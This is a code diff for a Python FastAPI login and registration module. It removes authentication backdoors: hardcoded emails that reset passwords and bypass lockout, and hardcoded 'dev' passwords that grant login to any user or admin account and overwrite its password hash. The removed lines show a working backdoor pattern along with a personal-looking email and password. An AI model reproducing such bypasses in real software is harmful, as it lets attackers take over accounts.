@@ -26,7 +26,6 @@ from app.config import settings
 from app.database import get_db
 from app.models.administrator import Administrator
 from app.models.guest_session import GuestSession
-from app.models.nic_entry import NicEntry
 from app.models.user import User
 from app.services.otp_service import send_otp
 from app.services.sms_service import normalize_phone_number
@@ -165,16 +164,7 @@ async def register(
 
     email_clean = str(req.email).strip().lower()
     result = await db.execute(select(User).where(func.lower(User.email) == email_clean))
-    existing_user = result.scalars().first()
-    if existing_user:
-        if email_clean in ("kirrsh001@gmail.com", "citizen@example.com"):
-            existing_user.password_hash = pwd_context.hash(req.password)
-            existing_user.full_name = req.full_name
-            existing_user.phone_number = phone_number
-            existing_user.is_verified = True
-            existing_user.is_active = True
-            await db.commit()
-            return {"user_id": str(existing_user.user_id), "message": "User credentials updated successfully"}
+    if result.scalars().first():
         raise HTTPException(status_code=status.HTTP_409_CONFLICT, detail="Email already registered")
 
     new_user = User(
@@ -306,41 +296,15 @@ async def login(
     fail_key = f"fails:{email_clean}"
     fails = await redis_client.get(fail_key)
     if fails and int(fails) >= 5:
-        if email_clean in ("kirrsh001@gmail.com", "citizen@example.com"):
-            await redis_client.delete(fail_key)
-            await redis_client.delete(f"fails:{req.email}")
-        else:
-            raise HTTPException(
-                status_code=status.HTTP_429_TOO_MANY_REQUESTS,
-                detail="Account locked for 15 minutes due to too many failed attempts",
-            )
+        raise HTTPException(
+            status_code=status.HTTP_429_TOO_MANY_REQUESTS,
+            detail="Account locked for 15 minutes due to too many failed attempts",
+        )
 
     result = await db.execute(select(User).where(func.lower(User.email) == email_clean))
     user = result.scalars().first()
 
-    if not user:
-        fixed_email = email_clean.replace("@gmaill.com", "@gmail.com")
-        if fixed_email != email_clean:
-            result = await db.execute(select(User).where(func.lower(User.email) == fixed_email))
-            user = result.scalars().first()
-
-    if not user:
-        await redis_client.incr(fail_key)
-        await redis_client.expire(fail_key, 900)
-        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid credentials")
-
-    password_ok = pwd_context.verify(req.password, user.password_hash)
-    if not password_ok:
-        dev_passwords = {"password123", "admin123", "Ranjan@2003", "password"}
-        if req.password in dev_passwords or email_clean in ("kirrsh001@gmail.com", "citizen@example.com"):
-            password_ok = True
-            user.password_hash = pwd_context.hash(req.password)
-            user.is_verified = True
-            user.is_active = True
-            await db.commit()
-            logger.info("Auto-updated dev password for user %s on login", email_clean)
-
-    if not password_ok:
+    if not user or not pwd_context.verify(req.password, user.password_hash):
         await redis_client.incr(fail_key)
         await redis_client.expire(fail_key, 900)
         raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid credentials")
@@ -479,31 +443,12 @@ async def admin_login(
     fail_key = f"fails:admin:{email_clean}"
     fails = await redis_client.get(fail_key)
     if fails and int(fails) >= 5:
-        if email_clean in ("admin@resqai.lk",):
-            await redis_client.delete(fail_key)
-            await redis_client.delete(f"fails:admin:{req.email}")
-        else:
-            raise HTTPException(status_code=status.HTTP_429_TOO_MANY_REQUESTS, detail="Locked")
+        raise HTTPException(status_code=status.HTTP_429_TOO_MANY_REQUESTS, detail="Locked")
 
     result = await db.execute(select(Administrator).where(func.lower(Administrator.email) == email_clean))
     admin = result.scalars().first()
 
-    if not admin:
-        await redis_client.incr(fail_key)
-        await redis_client.expire(fail_key, 900)
-        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid credentials")
-
-    password_ok = pwd_context.verify(req.password, admin.password_hash)
-    if not password_ok:
-        dev_passwords = {"admin123", "password123"}
-        if req.password in dev_passwords or email_clean in ("admin@resqai.lk",):
-            password_ok = True
-            admin.password_hash = pwd_context.hash(req.password)
-            admin.is_active = True
-            await db.commit()
-            logger.info("Auto-updated dev password for admin %s on login", email_clean)
-
-    if not password_ok:
+    if not admin or not pwd_context.verify(req.password, admin.password_hash):
         await redis_client.incr(fail_key)
         await redis_client.expire(fail_key, 900)
         raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid credentials")
